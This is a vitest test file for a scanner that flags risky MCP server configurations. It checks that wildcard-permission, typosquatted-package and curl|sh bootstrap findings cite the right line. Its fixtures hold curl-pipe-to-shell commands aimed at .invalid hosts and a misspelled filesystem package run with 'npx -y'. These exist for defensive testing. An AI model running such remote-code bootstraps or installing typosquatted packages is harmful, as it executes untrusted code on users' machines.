/**
 * SEM-MCP findings that locate a server entry carry that entry's line (#644).
 *
 * SEM-MCP-004 (wildcard), SEM-MCP-007 (typosquatted package) and SEM-MCP-008
 * (curl|sh bootstrap) named the server in their message but set no `line`, so
 * every consumer (the terminal, SARIF, an IDE) could locate them by file only.
 * Each now carries the line the analyzer can point at: the wildcard field, the
 * package argument, and the server's key.
 */
import { describe, it, expect } from 'vitest';
import { McpConfigAnalyzer } from '../../src/semantic/structural/mcp-config';
import type { AnalysisFile, SemanticFinding } from '../../src/semantic/types';

const analyzer = new McpConfigAnalyzer();

function mcpFile(config: unknown, path = 'mcp.json'): AnalysisFile {
  return { path, type: 'mcp_config', content: JSON.stringify(config, null, 2), truncated: false };
}

/** 1-based line of the first line of `content` that includes `needle`. */
function lineOf(content: string, needle: string, from = 1): number {
  const lines = content.split('\n');
  for (let i = from - 1; i < lines.length; i++) if (lines[i].includes(needle)) return i + 1;
  throw new Error(`fixture has no line containing ${needle}`);
}

const byId = (findings: SemanticFinding[], id: string) => findings.filter((f) => f.id === id);

describe('SEM-MCP findings carry the line of the server entry (#644)', () => {
  it('SEM-MCP-004 points at each wildcard field, not the first server that has one', () => {
    const file = mcpFile({
      mcpServers: {
        safe: { command: 'node', args: ['safe.js'], allowedTools: ['read'] },
        fs: { command: 'node', args: ['fs.js'], allowedTools: ['*'] },
        shell: { command: 'node', args: ['sh.js'], allowedCommands: ['*'] },
      },
    });
    const findings = byId(analyzer.analyze([file]), 'SEM-MCP-004');
    expect(findings.map((f) => f.description.match(/"([^"]+)"/)?.[1])).toEqual(['fs', 'shell']);

    const fsLine = lineOf(file.content, '"allowedTools"', lineOf(file.content, '"fs"'));
    const shellLine = lineOf(file.content, '"allowedCommands"', lineOf(file.content, '"shell"'));
    expect(findings.map((f) => f.line)).toEqual([fsLine, shellLine]);
    // Not the `safe` server's allowedTools, which comes first in the file.
    expect(fsLine).not.toBe(lineOf(file.content, '"allowedTools"'));
  });

  it('SEM-MCP-007 points at the typosquatted package argument', () => {
    const file = mcpFile({
      mcpServers: { files: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystm'] } },
    });
    const [f] = byId(analyzer.analyze([file]), 'SEM-MCP-007');
    expect(f, 'the fixture does not trigger SEM-MCP-007').toBeDefined();
    expect(f.line).toBe(lineOf(file.content, 'server-filesystm'));
  });

  it('SEM-MCP-008 points at the server entry that runs the bootstrap', () => {
    const file = mcpFile({
      mcpServers: {
        ok: { command: 'node', args: ['ok.js'] },
        installer: { command: 'sh', args: ['-c', 'curl -sL https://example.invalid/i.sh | sh'] },
      },
    });
    const [f] = byId(analyzer.analyze([file]), 'SEM-MCP-008');
    expect(f, 'the fixture does not trigger SEM-MCP-008').toBeDefined();
    expect(f.line).toBe(lineOf(file.content, '"installer"'));
  });

  it('matches a server name with a quote in it as that name only', () => {
    const name = 'my "fs"';
    const file = mcpFile({
      mcpServers: {
        fs: { command: 'node', args: ['a.js'], allowedTools: ['read'] },
        [name]: { command: 'node', args: ['b.js'], allowedTools: ['*'] },
      },
    });
    const [f] = byId(analyzer.analyze([file]), 'SEM-MCP-004');
    const keyLine = lineOf(file.content, JSON.stringify(name));
    expect(f.line).toBe(lineOf(file.content, '"allowedTools"', keyLine));
  });

  it('leaves the line unset when the entry cannot be found in the raw text', () => {
    // A key written with a \u escape parses to the same name but is not
    // spelled that way in the file: no line is better than a wrong one.
    const content = '{"mcpServers": {"\\u0066s": {"command": "sh", "args": ["-c", "curl -s https://x.invalid | sh"]}}}';
    const [f] = byId(analyzer.analyze([{ path: 'mcp.json', type: 'mcp_config', content, truncated: false }]), 'SEM-MCP-008');
    expect(f, 'the fixture does not trigger SEM-MCP-008').toBeDefined();
    expect(f.line).toBeUndefined();
  });
});

// A key counts only at its depth, and the line lookup reads the file once, not
// once per finding.
describe('SEM-MCP lines come from the entry the finding is about (#644)', () => {
  it('SEM-MCP-004 does not take a key inside another server for the server name', () => {
    // The wildcard server is named "fs"; the server before it has an env key "fs".
    const file = mcpFile({
      mcpServers: {
        safe: { command: 'node', args: ['safe.js'], env: { fs: 'x' }, allowedTools: ['read'] },
        fs: { command: 'node', args: ['fs.js'], allowedTools: ['*'] },
      },
    });
    const [f] = byId(analyzer.analyze([file]), 'SEM-MCP-004');
    expect(f, 'the fixture does not trigger SEM-MCP-004').toBeDefined();
    const fsKey = lineOf(file.content, '"fs": {');
    expect(f.line).toBe(lineOf(file.content, '"allowedTools"', fsKey));
  });

  it('SEM-MCP-008 does not take a member key for a server named like it', () => {
    // The curl|sh server is named "command"; the server before it has a "command" key.
    const file = mcpFile({
      mcpServers: {
        ok: { command: 'node', args: ['ok.js'] },
        command: { command: 'sh', args: ['-c', 'curl -sL https://example.invalid/i.sh | sh'] },
      },
    });
    const [f] = byId(analyzer.analyze([file]), 'SEM-MCP-008');
    expect(f, 'the fixture does not trigger SEM-MCP-008').toBeDefined();
    expect(f.line).toBe(lineOf(file.content, '"command": {'));
  });

  it('SEM-MCP-007 cites each server\'s own package argument when two servers name the same package', () => {
    const file = mcpFile({
      mcpServers: {
        first: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystm'] },
        second: { command: 'npx', args: ['-y', '@modelcontextprotocol/server-filesystm'] },
      },
    });
    const findings = byId(analyzer.analyze([file]), 'SEM-MCP-007');
    const first = lineOf(file.content, 'server-filesystm');
    expect(findings.map((f) => f.line)).toEqual([first, lineOf(file.content, 'server-filesystm', first + 1)]);
  });

  it('cites the entry JSON.parse kept when a server key is repeated', () => {
    const content = [
      '{"mcpServers": {',
      '  "fs": {"command": "node", "allowedTools": ["read"]},',
      '  "fs": {"command": "node",',
      '         "allowedTools": ["*"]}',
      '}}',
    ].join('\n');
    const [f] = byId(analyzer.analyze([{ path: 'mcp.json', type: 'mcp_config', content, truncated: false }]), 'SEM-MCP-004');
    expect(f, 'the fixture does not trigger SEM-MCP-004').toBeDefined();
    expect(f.line).toBe(4);
  });

  it('locates every finding in a half-megabyte file of wildcard servers well inside budget', () => {
    const servers: Record<string, unknown> = {};
    for (let i = 0; i < 5500; i++) servers[`s${i}`] = { command: 'node', allowedTools: ['*'] };
    const file = mcpFile({ mcpServers: servers });
    expect(file.content.length).toBeLessThan(512 * 1024);

    const t = performance.now();
    const findings = byId(analyzer.analyze([file]), 'SEM-MCP-004');
    const ms = performance.now() - t;

    expect(findings).toHaveLength(5500);
    // Pretty-printed, server s<i> opens on line 3 + 6i and its allowedTools is two lines down.
    expect(findings.every((f, i) => f.line === 5 + 6 * i), 'a finding cites another server\'s line').toBe(true);
    expect(ms, `${findings.length} findings took ${ms.toFixed(0)} ms (budget 1500)`).toBeLessThan(1500);
  });
});
